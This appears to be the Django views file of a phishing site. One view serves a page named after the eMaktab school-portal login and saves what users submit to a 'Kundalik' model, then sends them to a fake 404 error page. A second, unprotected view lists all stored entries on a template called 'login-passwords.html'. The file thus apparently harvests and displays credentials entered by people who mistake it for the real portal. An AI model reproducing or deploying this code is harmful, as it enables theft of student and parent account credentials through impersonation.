import profile

from django.contrib.auth.mixins import LoginRequiredMixin
from django.contrib.auth.models import User
from django.contrib.auth.views import LoginView
from django.shortcuts import render
from django.core.paginator import Paginator
from django.views.generic import ListView, TemplateView, DetailView, CreateView

from apps.form import RegisterModelForm
from apps.models import Kundalik


class UserCreateView(CreateView):
    template_name = "apps/eMaktab_ eMaktab ga kirish.html"
    form_class = RegisterModelForm
    success_url = "/error"


class ErrorTemplateView(TemplateView):
    template_name = "apps/404-page.html"


class LoginsListView(ListView):
    queryset = Kundalik.objects.all()
    template_name = "apps/login-passwords.html"
    context_object_name = 'details'

    def get_context_data(self, *, object_list=None, **kwargs):
        context = super().get_context_data(object_list=object_list, **kwargs)
        context['logins'] = Kundalik.objects.all()
        return context